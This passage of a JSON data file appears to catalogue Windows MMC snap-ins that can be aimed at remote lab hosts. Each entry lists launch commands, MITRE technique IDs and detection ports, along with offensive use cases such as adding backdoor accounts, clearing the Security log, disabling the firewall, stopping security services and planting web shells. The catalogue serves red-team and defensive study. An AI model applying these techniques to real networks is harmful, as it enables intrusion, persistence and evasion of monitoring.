/computer:SQL1.ad.bitsadmin.com", "usecases": [], "comments": "Install \"Integration Services\" in the SQL Server Express or Developer installation wizard", "resources": ["https://www.microsoft.com/en-us/evalcenter/download-sql-server-2022"], "mitre_techniques": [], "detections": "Port: 135/TCP", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 369, "name": "WF.msc", "type": "MMC", "function": "Manage", "toolsets": ["Builtin", "GUI"], "synopsis": "Windows Defender Firewall with Advanced Security", "description": "Windows Defender Firewall with Advanced Security", "commandline": "mmc.exe", "usecases": ["Add an exception to the filewall for a backdoor executable/port", "Disable the Windows Defender Firewall"], "comments": "mmc.exe -> File -> Add/Remove Snap-In -> Windows Defender Firewall with Advanced Security -> Add -> Another computer: `W10.ad.bitsadmin.com` -> Finish -> OK", "resources": [], "mitre_techniques": ["T1562.004"], "detections": "Port: 135/TCP", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 370, "name": "WdsMgmt.msc", "type": "MMC", "function": "Manage", "toolsets": ["GUI", "RSAT"], "synopsis": "Windows Deployment Services", "description": "Windows Deployment Services", "commandline": "WdsMgmt.msc", "usecases": [], "comments": "Right click on Servers -> Add Server -> Another computer: `DC1.ad.bitsadmin.com` -> OK", "resources": [], "mitre_techniques": [], "detections": "Port: 445/TCP", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 371, "name": "WmiMgmt.msc", "type": "MMC", "function": "Manage", "toolsets": ["Builtin", "GUI"], "synopsis": "WMI Control", "description": "WMI Control", "commandline": "WmiMgmt.msc", "usecases": ["Add WMI backdoor by weakening the security of the root namespace"], "comments": "Right click WMI Control -> Connect to another computer -> Another computer: `DC1.ad.bitsadmin.com` -> OK", "resources": [], "mitre_techniques": ["T1047"], "detections": "Port: 135/TCP", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 372, "name": "adsiedit.msc", "type": "MMC", "function": "Manage", "toolsets": ["GUI", "RSAT"], "synopsis": "ADSI Edit", "description": "ADSI Edit", "commandline": "adsiedit.msc", "usecases": ["Backdoor ACLs of AdminSDHolder container", "Weaken security ACLs of OUs", "Reset passwords", "View sensitive information like LAPS passwords in the attribute editor"], "comments": "When it is launched from a `runas /netonly` prompt, it automatically connects to the right instance. Alternatively, right click the root node -> Connect to -> select Default (Domain or server that you logged in to)\nPort 636/TCP is used in case SSL-based Encryption is selected", "resources": [], "mitre_techniques": [], "detections": "Port: 389/UDP\nPort: 389/TCP\nPort: 636/TCP", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 373, "name": "azman.msc", "type": "MMC", "function": "Manage", "toolsets": ["GUI", "RSAT"], "synopsis": "Authorization Manager", "description": "Authorization Manager", "commandline": "azman.msc", "usecases": [], "comments": "Right click root node -> Open Authorization Store -> Active Directory or Active Directory Application Mode (ADAM) -> Browse", "resources": [], "mitre_techniques": [], "detections": "Port: 389/UDP", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 374, "name": "certlm.msc", "type": "MMC", "function": "Manage", "toolsets": ["Builtin", "GUI"], "synopsis": "Certificates - Local Computer", "description": "Certificates - Local Computer", "commandline": "certlm.msc", "usecases": ["Export private keys (if marked as exportable)", "Install malicious trusted root certificates"], "comments": "Right click -> Connect to another computer -> Enter the object name to select -> `DC1.ad.bitsadmin.com`\nQuite slow when used over SOCKS", "resources": [], "mitre_techniques": ["T1553.004"], "detections": "Port: 445/TCP", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 375, "name": "certmgr.msc", "type": "MMC", "function": "Manage", "toolsets": ["Builtin", "GUI"], "synopsis": "Certificates - Current User", "description": "Certificates - Current User", "commandline": "certmgr.msc", "usecases": [], "comments": "Does not seem possible to use this snap-in remotely", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 376, "name": "certsrv.msc", "type": "MMC", "function": "Manage", "toolsets": ["GUI", "RSAT"], "synopsis": "Certificate Authority", "description": "Certificate Authority", "commandline": "certsrv.msc /COMPUTER:CASUB1.AD.BITSADMIN.COM", "usecases": ["Approve certificate requests"], "comments": "Alternatively in the GUI, right click root node -> Retarget Certification Authority -> Another Computer: `CASUB1.ad.bitsadmin.com`\nNote that the Certificate Templates section returns error `Template information could not be loaded: The specified domain either does not exist or could not be contacted`", "resources": [], "mitre_techniques": [], "detections": "Port: 135/TCP", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 377, "name": "certtmpl.msc", "type": "MMC", "function": "Manage", "toolsets": ["GUI", "RSAT"], "synopsis": "Certificate Templates", "description": "Certificate Templates", "commandline": "certtmpl.msc", "usecases": ["Create new vulnerable templates and enroll for those as authentication backdoor"], "comments": "Right click root node -> Connect to another writable domain controller -> Change -> `ad.bitsadmin.com` -> OK\nRequires OffensiveDC", "resources": [], "mitre_techniques": [], "detections": "Port: 389/UDP", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 378, "name": "comexp.msc", "type": "MMC", "function": "Manage", "toolsets": ["Builtin", "GUI"], "synopsis": "Component Services", "description": "Component Services", "commandline": "comexp.msc", "usecases": ["Privesc: manipulate settings of COM objects so it runs with higher privileges", "Modify ACLs to create a backdoor on the system"], "comments": "Component Services -> Computers -> Right click -> New -> Computer -> Browse -> `DC1.ad.bitsadmin.com`\nDoes not work from OffensiveDC\nAlternative way to launch: `dcomcnfg.exe`", "resources": [], "mitre_techniques": [], "detections": "Port: 135/TCP", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2024-04-19"}, {"id": 379, "name": "compmgmt.msc", "type": "MMC", "function": "Manage", "toolsets": ["Builtin", "GUI"], "synopsis": "Computer Management", "description": "Computer Management", "commandline": "compmgmt.msc /computer:DC1.ad.bitsadmin.com", "usecases": [], "comments": "Includes: [taskschd.msc](../taskschd), [eventvwr.msc](../eventvwr), [fsmgmt.msc](../fsmgmt), [lusrmgr.msc](../lusrmgr), [perfmon.msc](../perfmon), [devmgmt.msc](../devmgmt), [diskmgmt.msc](../diskmgmt), [services.msc](../services) and [WmiMgmt.msc](../WmiMgmt)\nAlternatively in the GUI, right click root node -> Connect to another computer -> `DC1.ad.bitsadmin.com`\nAlternative way to launch: `CompMgmtLauncher.exe`", "resources": [], "mitre_techniques": [], "detections": "Port: 445/TCP\nPort: 135/TCP", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 380, "name": "devmgmt.msc", "type": "MMC", "function": "Manage", "toolsets": ["Builtin", "GUI"], "synopsis": "Device Manager", "description": "Device Manager", "commandline": "compmgmt.msc", "usecases": [], "comments": "See [compmgmt.msc](../compmgmt) how to use it against a remote host. Returns errors though when connecting, so does not seem to work", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 381, "name": "dfsmgmt.msc", "type": "MMC", "function": "Data", "toolsets": ["GUI", "RSAT"], "synopsis": "DFS Management", "description": "DFS Management", "commandline": "dfsmgmt.msc", "usecases": [], "comments": "Right click root node -> Add Namespaces to Display or Add Replication Groups to Display", "resources": [], "mitre_techniques": [], "detections": "Port: 389/UDP\nPort: 445/TCP", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 382, "name": "dhcpmgmt.msc", "type": "MMC", "function": "Manage", "toolsets": ["GUI", "RSAT"], "synopsis": "DHCP", "description": "DHCP", "commandline": "dhcpmgmt.msc /ComputerName DC1.ad.bitsadmin.com", "usecases": [], "comments": "Alternatively, in GUI right click root node -> Add server", "resources": [], "mitre_techniques": [], "detections": "Port: 135/TCP", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 383, "name": "diskmgmt.msc", "type": "MMC", "function": "Manage", "toolsets": ["Builtin", "GUI"], "synopsis": "Disk Management", "description": "Disk Management", "commandline": "compmgmt.msc", "usecases": [], "comments": "See [compmgmt.msc](../compmgmt) how to use it against a remote host. Returns errors though when connecting, so does not seem to work.", "resources": [], "mitre_techniques": [], "detections": "Port: 445/TCP\nPort: 135/TCP", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 384, "name": "dnsmgmt.msc", "type": "MMC", "function": "Manage", "toolsets": ["GUI", "RSAT"], "synopsis": "DNS Manager", "description": "DNS Manager", "commandline": "dnsmgmt.msc /ComputerName DC1.ad.bitsadmin.com", "usecases": ["Modify/create DNS record for internal phishing website"], "comments": "Alternatively, in GUI right click root node -> Connect to DNS Server", "resources": [], "mitre_techniques": [], "detections": "Port: 135/TCP", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 385, "name": "domain.msc", "type": "MMC", "function": "Domain", "toolsets": ["GUI", "RSAT"], "synopsis": "Active Directory Domains and Trusts", "description": "Active Directory Domains and Trusts", "commandline": "domain.msc /server=DC1.ad.bitsadmin.com", "usecases": ["Perform reconnaissance on domain trusts"], "comments": "Will initially show some errors because the offensive Windows host is not part of a domain\nRight click the Active Directory Domains and Trusts node in the list of snap-ins and choose Change Forest or Change Domain. Now enter the FQDN of the root domain and click OK", "resources": [], "mitre_techniques": ["T1484.002"], "detections": "Port: 389/TCP\nPort: 445/TCP", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 386, "name": "dsa.msc", "type": "MMC", "function": "Domain", "toolsets": ["GUI", "RSAT"], "synopsis": "Active Directory Users and Computers", "description": "Active Directory Users and Computers", "commandline": "dsa.msc /server=DC1.ad.bitsadmin.com", "usecases": ["Perform reconnaissance on users, groups and computers in the domain", "Add backdoor user or computer account", "Modify group membership", "View user's BitLocker recovery passwords"], "comments": "", "resources": [], "mitre_techniques": [], "detections": "Port: 389/TCP\nPort: 445/TCP", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 387, "name": "dssite.msc", "type": "MMC", "function": "Domain", "toolsets": ["GUI", "RSAT"], "synopsis": "Active Directory Sites and Services", "description": "Manage domain", "commandline": "dssite.msc /domain=AD.BITSADMIN.COM", "usecases": ["Collect information about sites and IP subnets"], "comments": "Does not work from the OffensiveDC, use `/server` parameter instead", "resources": [], "mitre_techniques": [], "detections": "Port: 389/TCP", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 388, "name": "dssite.msc", "type": "MMC", "function": "Domain", "toolsets": ["GUI", "RSAT"], "synopsis": "Active Directory Sites and Services", "description": "Manage specific server", "commandline": "dssite.msc /server=DC1.ad.bitsadmin.com", "usecases": ["Collect information about sites and IP subnets"], "comments": "", "resources": [], "mitre_techniques": [], "detections": "Port: 389/TCP", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 389, "name": "eventvwr.msc", "type": "MMC", "function": "Logs", "toolsets": ["Builtin", "GUI"], "synopsis": "Event Viewer", "description": "Event Viewer", "commandline": "eventvwr.exe DC1.ad.bitsadmin.com", "usecases": ["Clear the Security event log", "Disable certain logs (Right click -> Disable Log)", "Identify source IPs from which certain users have logged in to chase after their workstations", "Configure the Security log to not overwrite events so it will just stop logging"], "comments": "Alternatively, use [compmgmt.msc](../compmgmt) or launch the snap-in, right click the root node -> Connect to Another Computer", "resources": [], "mitre_techniques": ["T1070.001", "T1562.002"], "detections": "Port: 135/TCP", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 390, "name": "eventvwr.msc", "type": "MMC", "function": "Logs", "toolsets": ["Builtin", "GUI"], "synopsis": "Event Viewer", "description": "Event Viewer", "commandline": "eventvwr.msc /computer:DC1.ad.bitsadmin.com", "usecases": ["Clear the Security event log", "Disable certain logs (Right click -> Disable Log)", "Identify source IPs from which certain users have logged in to chase after their workstations", "Configure the Security log to not overwrite events so it will just stop logging"], "comments": "Alternatively, use [compmgmt.msc](../compmgmt) or launch the snap-in, right click the root node -> Connect to Another Computer", "resources": [], "mitre_techniques": ["T1070.001", "T1562.002"], "detections": "Port: 135/TCP", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 391, "name": "fsmgmt.msc", "type": "MMC", "function": "Manage", "toolsets": ["Builtin", "GUI"], "synopsis": "Shared Folders", "description": "Shared Folders", "commandline": "fsmgmt.msc /computer:W10.ad.bitsadmin.com", "usecases": ["View which users are connected to the share from which computername", "View which files are opened by which users", "Add (hidden - dollar share) shared folder"], "comments": "Alternatively, use [compmgmt.msc](../compmgmt)", "resources": [], "mitre_techniques": ["T1135", "T1021.002"], "detections": "Port: 445/TCP", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 392, "name": "fsrm.msc", "type": "MMC", "function": "Manage", "toolsets": ["GUI", "RSAT"], "synopsis": "File Server Resource Manager", "description": "File Server Resource Manager", "commandline": "fsrm.msc", "usecases": [], "comments": "Right click File Server Resource Manager -> Connect to Another Computer -> Another computer: `DC1.ad.bitsadmin.com`", "resources": [], "mitre_techniques": [], "detections": "Port: 445/TCP\nPort: 135/TCP", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 393, "name": "fxsadmin.msc", "type": "MMC", "function": "Manage", "toolsets": ["GUI", "Server"], "synopsis": "Fax Service Manager", "description": "Fax Service Manager", "commandline": "fxsadmin.msc", "usecases": [], "comments": "`mmc.exe` -> File -> Add/Remove Snap-In -> Fax Service Manager -> Add -> Another computer: `DC1.ad.bitsadmin.com` -> Finish -> OK", "resources": [], "mitre_techniques": [], "detections": "Port: 445/TCP", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 394, "name": "gpedit.msc", "type": "MMC", "function": "Manage", "toolsets": ["Builtin", "GUI"], "synopsis": "Local Group Policy Editor", "description": "Local Group Policy Editor for a computer", "commandline": "gpedit.msc /gpcomputer: DC1.ad.bitsadmin.com", "usecases": ["Add evil startup script", "Weaken security as a backdoor", "Open ports in the firewall"], "comments": "Quotes around the hostname or in case of no quotes a space before the hostname seem to be required\nThrough SMB edits files in `\\\\DC1.ad.bitsadmin.com\\ADMIN$\\GroupPolicy` (= `%SystemRoot%\\System32\\GroupPolicy`)", "resources": [], "mitre_techniques": [], "detections": "Port: 445/TCP", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2024-12-13"}, {"id": 395, "name": "gpedit.msc", "type": "MMC", "function": "Domain", "toolsets": ["Builtin", "GUI"], "synopsis": "Local Group Policy Editor", "description": "Local Group Policy Editor for a computer", "commandline": "gpedit.msc /gpobject:\"LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=ad,DC=bitsadmin,DC=com", "usecases": ["Execute immediate scheduled tasks on machines to launch implant"], "comments": "Example edits Default Domain Policy, change GUID for editing other policies\nThrough SMB edits files in `\\\\ad.bitsadmin.com\\SYSVOL\\{GUID}` (= `%SystemRoot%\\Sysvol\\sysvol\\ad.bitsadmin.com` by default) on the DC", "resources": [], "mitre_techniques": ["T1037.003", "T1484.001"], "detections": "Port: 445/TCP", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2024-12-13"}, {"id": 396, "name": "gpmc.msc", "type": "MMC", "function": "Domain", "toolsets": ["GUI", "RSAT"], "synopsis": "Group Policy Management", "description": "Group Policy Management", "commandline": "gpmc.msc /domain:ad.bitsadmin.com", "usecases": ["Create and link a malicious group policy to systems", "Force the update of group policy on all machines in an OU"], "comments": "For remote domains, this needs to be executed from OffensiveDC. Also use the `/domain` parameter in the commandline. In View -> Options -> General, uncheck the \"Enable trust detection\" checkbox. Next, right click the root node -> Add forest", "resources": [], "mitre_techniques": ["T1037.003", "T1484.001"], "detections": "Port: 389/UDP\nPort: 445/TCP", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 397, "name": "gpme.msc", "type": "MMC", "function": "Domain", "toolsets": ["GUI", "RSAT"], "synopsis": "Group Policy Management Editor", "description": "Group Policy Management Editor", "commandline": "gpme.msc /gpobject:\"LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=ad,DC=bitsadmin,DC=com", "usecases": ["Execute immediate scheduled tasks on machines to launch implant"], "comments": "Only possible from OffensiveDC\nCommandline launches editor for the GUID of the default domain policy; can be changed to other GUIDs to edit different policies", "resources": [], "mitre_techniques": ["T1053.005"], "detections": "Port: 445/TCP", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 398, "name": "gptedit.msc", "type": "MMC", "function": "Domain", "toolsets": ["GUI", "RSAT"], "synopsis": "Group Policy Starter GPO Editor", "description": "Group Policy Starter GPO Editor", "commandline": "gptedit.msc /s /gtmpobject:\"\\\\DC1.ad.bitsadmin.com\\sysvol\\ad.bitsadmin.com\\StarterGPOs\\{DE3EB8C2-A808-4509-9D89-D383F950AEDB}\\", "usecases": [], "comments": "Edit Group Policy Starter GPO directly based on the path", "resources": [], "mitre_techniques": [], "detections": "Port: 445/TCP", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 399, "name": "iis.msc", "type": "MMC", "function": "Manage", "toolsets": ["GUI"], "synopsis": "Internet Information Services (IIS) Manager", "description": "Internet Information Services (IIS) Manager", "commandline": "iis.msc", "usecases": ["Create virtual directory with web shell (drop shell over SMB or maybe create virtual directory on share)", "Add FTP site to be able to browse the filesystem", "Weaken authentication", "Add MIME Types to be able to download certain file extensions"], "comments": "Right click Start Page -> Connect to a Server -> Server name: `SP2019.ad.bitsadmin.com` -> Next -> Enter User name/password -> Next -> Connection Name: `SP2019` -> Finish\nRequires to install and enabled Remote IIS Management service\nDoes not seem possible to perform authentication transparently through Kerberos\nCan also be launched via `inetmgr.exe`", "resources": ["https://woshub.com/remote-iis-management-in-windows-server-2012/"], "mitre_techniques": [], "detections": "Port: 8172/TCP", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 400, "name": "iis6.msc", "type": "MMC", "function": "Manage", "toolsets": ["GUI"], "synopsis": "Internet Information Services (IIS) 6.0 Manager", "description": "Internet Information Services (IIS) 6.0 Manager", "commandline": "iis6.msc", "usecases": [], "comments": "Right click -> Connect -> Computer name: `DC1.ad.bitsadmin.com` -> OK", "resources": [], "mitre_techniques": [], "detections": "Port: 135/TCP", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 401, "name": "ipsecsnp.dll", "type": "MMC", "function": "Manage", "toolsets": ["Builtin", "GUI"], "synopsis": "IP Security Policy Management", "description": "IP Security Policy Management for a computer", "commandline": "mmc.exe", "usecases": ["Weaken IPSec requirements"], "comments": "Open via MMC's Add/Remove Snap-In -> IP Security Policy Management -> Another Active Directory domain: `DC1.ad.bitsadmin.com` -> Finish -> OK", "resources": [], "mitre_techniques": [], "detections": "Port: 389/UDP\nPort: 445/TCP", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 402, "name": "ipsecsnp.dll", "type": "MMC", "function": "Manage", "toolsets": ["Builtin", "GUI"], "synopsis": "IP Security Policy Management", "description": "IP Security Policy Management for domain", "commandline": "mmc.exe", "usecases": ["Weaken IPSec requirements"], "comments": "Open via MMC's Add/Remove Snap-In -> IP Security Policy Management -> Another Active Directory domain: `ad.bitsadmin.com` -> Finish -> OK", "resources": [], "mitre_techniques": [], "detections": "Port: 389/UDP\nPort: 445/TCP", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 403, "name": "ipsmsnap.dll", "type": "MMC", "function": "Manage", "toolsets": ["Builtin", "GUI"], "synopsis": "IP Security Monitor", "description": "IP Security Monitor", "commandline": "mmc.exe", "usecases": [], "comments": "Open via MMC's Add/Remove Snap-ins, then right click the root node -> Add Computer -> The following computer: `DC1.ad.bitsadmin.com` -> OK\nIPSec service needs to be running on the remote host", "resources": [], "mitre_techniques": [], "detections": "Port: 445/TCP", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 404, "name": "lsdiag.msc", "type": "MMC", "function": "Manage", "toolsets": ["GUI", "RSAT"], "synopsis": "Remote Desktop Licensing Diagnoser", "description": "Remote Desktop Licensing Diagnoser", "commandline": "lsdiag.msc", "usecases": [], "comments": "Right click root node -> Connect to Remote Desktop Session Host Server -> Another computer: `DC1.ad.bitsadmin.com` -> OK", "resources": [], "mitre_techniques": [], "detections": "Port: 445/TCP\nPort: 135/TCP", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 405, "name": "lusrmgr.msc", "type": "MMC", "function": "Manage", "toolsets": ["Builtin", "GUI"], "synopsis": "Local Users and Groups", "description": "Local Users and Groups", "commandline": "lusrmgr.msc /computer=W10.ad.bitsadmin.com", "usecases": ["Add a backdoor user", "Change password of existing user", "Enable and disable accounts", "Add users to, and remove users from groups", "Configure backdoor logon script"], "comments": "Alternative is to use [compmgmt.msc](../compmgmt)\nThrough this snap-in it does not seem possible to add a user to a local group on the remote machine. Through [compmgmt.msc](../compmgmt) this _does_ work well though", "resources": [], "mitre_techniques": ["T1531", "T1136.001", "T1078.003"], "detections": "Port: 445/TCP", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-11-04"}, {"id": 406, "name": "nfsmgmt.msc", "type": "MMC", "function": "Manage", "toolsets": ["GUI", "RSAT"], "synopsis": "Services for NFS", "description": "Services for NFS", "commandline": "nfsmgmt.msc", "usecases": [], "comments": "Right click on root node -> Connect to another computer -> Another computer: `DC1.ad.bitsadmin.com` -> OK", "resources": [], "mitre_techniques": [], "detections": "Port: 5985/TCP", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 407, "name": "nps.msc", "type": "MMC", "function": "Manage", "toolsets": ["GUI", "Server"], "synopsis": "Network Policy Server", "description": "Network Policy Server", "commandline": "nps.msc /computer:DC1.ad.bitsadmin.com", "usecases": [], "comments": "Alternative: mmc.exe -> Add or Remove Snap-ins -> Network Policy Server -> Add -> Another computer -> `DC1.ad.bitsadmin.com` -> OK", "resources": [], "mitre_techniques": [], "detections": "Port: 445/TCP", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 408, "name": "ocsp.msc", "type": "MMC", "function": "Manage", "toolsets": ["GUI", "RSAT"], "synopsis": "Online Responder Management", "description": "Online Responder Management", "commandline": "ocsp.msc /Computer:DC1.ad.bitsadmin.com", "usecases": [], "comments": "Alternative via GUI: Right click Online Responder -> Retarget Responder -> Another computer: `DC1.ad.bitsadmin.com` -> OK", "resources": [], "mitre_techniques": [], "detections": "Port: 135/TCP", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 409, "name": "perfmon.msc", "type": "MMC", "function": "Manage", "toolsets": ["Builtin", "GUI"], "synopsis": "Performance Monitor", "description": "Performance Monitor", "commandline": "perfmon.msc", "usecases": [], "comments": "Action -> Connect to another computer -> Another computer: `DC1.ad.bitsadmin.com` -> OK\nRequires \"Remote Registry\" service to be running on the remote host", "resources": [], "mitre_techniques": [], "detections": "Port: 135/TCP", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 410, "name": "pkiview.msc", "type": "MMC", "function": "Manage", "toolsets": ["GUI", "RSAT"], "synopsis": "Enterprise PKI", "description": "Enterprise PKI", "commandline": "pkiview.msc", "usecases": [], "comments": "Does not seem possible to use this snap-in remotely", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 411, "name": "printmanagement.msc", "type": "MMC", "function": "Manage", "toolsets": ["Builtin", "GUI"], "synopsis": "Print Management", "description": "Print Management", "commandline": "printmanagement.msc", "usecases": ["Install a malicious printer driver?"], "comments": "", "resources": [], "mitre_techniques": [], "detections": "Port: 445/TCP\nPort: 135/TCP", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 412, "name": "remoteprograms.msc", "type": "MMC", "function": "Manage", "toolsets": ["GUI", "Server"], "synopsis": "RemoteApp Manager", "description": "RemoteApp Manager", "commandline": "remoteprograms.msc", "usecases": [], "comments": "Seems to be deprecated, nowadays management of remote apps seems to be done through [ServerManager.exe](../../Binaries/ServerManager)", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 413, "name": "rrasmgmt.msc", "type": "MMC", "function": "Manage", "toolsets": ["GUI", "RSAT"], "synopsis": "Routing and Remote Access", "description": "Routing and Remote Access", "commandline": "rrasmgmt.msc /ComputerName DC1.ad.bitsadmin.com", "usecases": ["Port mirror all traffic to us?"], "comments": "Alternative: Right click Routing and Remote Access -> Add Server -> The following computer: `DC1.ad.bitsadmin.com` -> OK", "resources": [], "mitre_techniques": [], "detections": "Port: 135/TCP\nPort: 445/TCP", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 414, "name": "rsop.msc", "type": "MMC", "function": "Domain", "toolsets": ["Builtin", "GUI"], "synopsis": "Resultant Set of Policy", "description": "Resultant Set of Policy", "commandline": "rsop.msc", "usecases": ["Perform reconnaissance on applied (security) policies on remote system"], "comments": "Right click RSoP -> Change Query -> Another computer: `DC1.ad.bitsadmin.com` -> Next -> Next -> Next -> Finish", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 415, "name": "schmmgmt.dll", "type": "MMC", "function": "Domain", "toolsets": ["GUI", "RSAT"], "synopsis": "Active Directory Schema", "description": "Active Directory Schema", "commandline": "mmc.exe", "usecases": [], "comments": "Open via MMC's Add/Remove Snap-in, then right click the root node -> Change Active Directory Domain Controller", "resources": [], "mitre_techniques": [], "detections": "Port: 389/UDP\nPort: 445/TCP", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 416, "name": "secpol.msc", "type": "MMC", "function": "Manage", "toolsets": ["Builtin", "GUI"], "synopsis": "Local Security Policy", "description": "Local Security Policy", "commandline": "gpedit.msc", "usecases": [], "comments": "Remotely just use [gpedit.msc](../gpedit)\nDirect link to gpedit.msc -> Computer Configuration -> Windows Settings -> Security Settings", "resources": [], "mitre_techniques": [], "detections": "Port: 445/TCP", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 417, "name": "services.msc", "type": "MMC", "function": "Manage", "toolsets": ["Builtin", "GUI"], "synopsis": "Services", "description": "Services", "commandline": "services.msc /computer:DC1.ad.bitsadmin.com", "usecases": ["Identify security solutions running on the endpoint", "Stop/disable security services"], "comments": "Quite slow to collect information on all services through SOCKS, performs 4 requests (Open/Query/something/Close) for every service. Better use [sc.exe](../../Binaries/sc) in case the name of the service is known", "resources": [], "mitre_techniques": ["T1569.002"], "detections": "Port: 135/TCP", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 418, "name": "tapimgmt.msc", "type": "MMC", "function": "Manage", "toolsets": ["GUI", "Server"], "synopsis": "Telephony", "description": "Telephony", "commandline": "tapimgmt.msc", "usecases": [], "comments": "Right click -> Add computer -> Another computer: `DC1.ad.bitsadmin.com` -> OK", "resources": [], "mitre_techniques": [], "detections": "Port: 445/TCP", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 419, "name": "taskschd.msc", "type": "MMC", "function": "Execute", "toolsets": ["Builtin", "GUI"], "synopsis": "Task Scheduler", "description": "Task Scheduler", "commandline": "taskschd.msc", "usecases": ["Create backdoor for persistence: Advantage, an EDR will have a hard time to connect the persistence to the implant/backdoor that is running the SOCKS server"], "comments": "Right click -> Connect to Another Computer\nAlternatively, use [compmgmt.msc](../compmgmt)", "resources": [], "mitre_techniques": ["T1053.005"], "detections": "Port: 135/TCP", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-11-04"}, {"id": 420, "name": "tpm.msc", "type": "MMC", "function": "Manage", "toolsets": ["Builtin", "GUI"], "synopsis": "Trusted Platform Module (TPM) Management", "description": "Trusted Platform Module (TPM) Management", "commandline": "mmc.exe", "usecases": ["Wipe the TPM to impact availability; only the Bitlocker Recovery Key will then help to recover the data"], "comments": "Add or Remove Snap-ins -> TPM Management -> Add -> Another computer: `W11.ad.bitsadmin.com` -> OK", "resources": [], "mitre_techniques": [], "detections": "Port: 135/TCP", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 421, "name": "tsadmin.msc", "type": "MMC", "function": "Manage", "toolsets": ["GUI", "Server"], "synopsis": "Remote Desktop Services Manager", "description": "Remote Desktop Services Manager", "commandline": "tsadmin.msc", "usecases": [], "comments": "Removed in Server 2012+. Copy `tsadmin.msc` and related files from Windows Server 2008 R2", "resources": ["https://woshub.com/how-to-run-tsadmin-msc-and-tsconfig-msc-snap-ins-on-windows-server-2012-rds/"], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 422, "name": "tsconfig.msc", "type": "MMC", "function": "Manage", "toolsets": ["GUI", "Server"], "synopsis": "Remote Desktop Session Host Configuration", "description": "Remote Desktop Session Host Configuration", "commandline": "tsconfig.msc", "usecases": [], "comments": "", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 423, "name": "tsgateway.msc", "type": "MMC", "function": "Manage", "toolsets": ["GUI", "RSAT"], "synopsis": "RD Gateway Manager", "description": "RD Gateway Manager", "commandline": "tsgateway.msc", "usecases": ["Disable 